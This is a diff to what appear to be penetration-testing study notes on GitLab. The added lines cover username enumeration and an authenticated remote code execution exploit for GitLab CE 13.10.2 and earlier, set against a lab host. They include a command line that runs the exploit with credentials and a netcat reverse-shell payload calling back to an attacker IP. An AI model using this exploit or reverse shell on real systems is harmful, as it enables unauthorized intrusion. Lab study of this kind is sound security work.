@@ -10,4 +10,11 @@ Sometimes, aside from gaining credentials from other place, Gitlab maybe configu
 
 User Enumeration:
 
-Like WordPress, due to unique response when attempting to register for user, we can perform username enumeration and email enumeration
+Like WordPress, due to unique response when attempting to register for user, we can perform username enumeration and email enumeration, here an automated enumerator is available https://www.exploit-db.com/exploits/49821
+
+Authenticated RCE:
+
+All gitlab instance with version lower or equal to CE version 13.10.2 will suffer from this authenticated RCE, where we can use this exploit: https://www.exploit-db.com/exploits/49951, below is an example:
+```
+python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+```
